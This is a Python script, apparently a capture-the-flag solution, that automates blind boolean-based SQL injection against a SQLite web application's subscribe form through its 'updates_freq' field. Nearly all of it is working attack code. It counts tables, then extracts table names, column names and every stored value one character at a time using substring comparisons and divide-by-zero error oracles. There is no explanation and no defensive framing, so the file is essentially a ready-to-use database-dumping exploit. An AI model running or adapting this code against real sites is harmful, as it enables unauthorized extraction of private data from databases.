#! /usr/bin/env python3
import requests
import string
import json
from urllib.parse import urlencode

url = "http://senseixenus.playat.flagyard.com/subscribe"
charset = string.printable
valid_word = "You have successfully subscribed!"
def count_table():
    for i in range(100):
        payload = f"0' and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = {i+1}--+"
        data = {"email":"a@gmail.com","updates_freq":payload}
        res = requests.post(url,data=data).text
        if valid_word in res:
            print(f"[+] Number of tables-:{i+1}")
            return i+1
            break

def find_tableLength(length):
    print("[+]Finding table Length")
    while True:
        for length in range(length,length+1):
             for i in range(100):
                 payload= f"0' and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT {length+1} OFFSET {length}) = {i+1}--+"
                 data = {"email":"a@gmail.com","updates_freq":payload}
                 res = requests.post(url,data=data).text
                 if valid_word in res:
                    print(f"[+] Table-Length:-:{i+1}")
                    return i+1
                    break
def read_tableChar(tables_number):
    table_name = []
    for i in range(0,tables_number):
        table_name.append("")
        length = find_tableLength(i)
        for digit in range(0,length):
            for char in charset:
                payload = f"0' and (SELECT hex(substr(tbl_name,{digit+1},1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit {i+1} offset {i}) = hex('{char}')--+"
                data = {"email":"a@gmail.com","updates_freq":payload}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    table_name[i] += char
                    break
            if len(table_name[i]) == length:
               print(f"[+] Table Found: {table_name[i]}")
               pass
               if len(table_name) == tables_number:
                   print(f"[+] Tables:{table_name}")
                   break           
    return table_name
def count_columns(table: str):
    while True:
        print(f"[+] Table:{table}")
        for digit in range(500):
            payload = f"0' and (SELECT count(name) FROM PRAGMA_TABLE_INFO('{table}'))={digit+1}--+"
            data = {"email":"a@gmail.com","updates_freq":payload}
            res = requests.post(url,data=data).text
            if valid_word in res:
                print(f"[+] Number of Columns-:{digit+1}")
                return digit+1
                break 
def find_columnLength(length: int,table: str):
    print("[+]Finding Columnn Length")
    while True:
        for length in range(length,length+1):
            for i in range(100):
                payload= f"0' and (SELECT length(name) FROM PRAGMA_TABLE_INFO('{table}') LIMIT {length+1} OFFSET+{length})={i}--+"
                data = {"email":"a@gmail.com","updates_freq":payload}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Column-Length:-:{i}")
                    return i
                    break
def read_columnChars(column_number,table_name):
    column_names = {}.fromkeys([table_name])
    print(f"[+]Dumping Columns:table:{table_name}")
    column_names[table_name] = []
    for i in range(0,column_number):
        column_names[table_name].append("")
        length = find_columnLength(i,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"0' and (select case substr(name,1,{digit+1}) WHEN '{column_names[table_name][i] +char}' THEN 1 ELSE 1/0 END FROM PRAGMA_TABLE_INFO('{table_name}') LIMIT {i+1} OFFSET {i})--+"
                data = {"email":"a@gmail.com","updates_freq":payload}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    column_names[table_name][i] += char
                    break
            if (len(column_names[table_name][i]) == length):
               print(f"[+] Column name dumped::{column_names[table_name][i]}")
               pass
               if len(column_names[table_name]) == column_number:
                  print(f"[+] ColumnDumped::{column_names}")
                  break
    return column_names
def count_Data(column_name,table_name):
    while True:
        for digit in range(200):
            payload = f"0' and (SELECT count({column_name}) FROM {table_name})={digit}--+"
            data = {"email":"a@gmail.com","updates_freq":payload}
            res = requests.post(url,data=data).text
            if valid_word in res:
                print(f"[+] Number of Data's strings-:{digit}")
                return digit
                break
def count_stringLength(data_length,column_name,table_name):
    print("[+]Finding String Length")
    while True:
        for length in range(data_length,data_length+1):
            for i in range(100):
                payload= f"0' and (SELECT length({column_name}) FROM {table_name} LIMIT {length+1} OFFSET {length})={i}--+"
                data = {"email":"a@gmail.com","updates_freq":payload}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] String-Length:-:{i}")
                    return i
                    break
def readChars(data_length,column_name,table_name):
    data_names = {}.fromkeys([column_name])
    print(f"[+]Dumping String:table:{table}:column:{column_name}")
    data_names[column_name] = []
    for i in range(0,data_length):
        data_names[column_name].append("")
        length = count_stringLength(i,column_name,table_name)
        for digit in range(0,length):
            for char in charset:
                payload = f"0' and (select case substr({column_name},1,{digit+1}) WHEN '{data_names[column_name][i]+char}' THEN 1 ELSE 1/0 END FROM {table_name} LIMIT {i+1} OFFSET {i})--+"
                data = {"email":"a@gmail.com","updates_freq":payload}
                res = requests.post(url,data=data).text
                if valid_word in res:
                    print(f"[+] Found Char:-:{char}")
                    data_names[column_name][i] += char
                    break
            if (len(data_names[column_name][i]) == length):
               print(f"[+] Column {column_name} dumped::{data_names[column_name][i]}")
               pass
               if len(data_names) == data_length:
                  print(f"[+] ColumnDumped::{data_names}")
                  break
               
if __name__ == "__main__":
    tables_number: str = count_table()
    #tables = read_tableChar(tables_number)
    tables = ["subscribers", "feedback", "updates_freq"]
    for table in tables:
        column_number = count_columns(table)
        columns = read_columnChars(column_number,table)
        for column in columns[table]:
            data_length = count_Data(column,table)
            readChars(data_length,column,table)
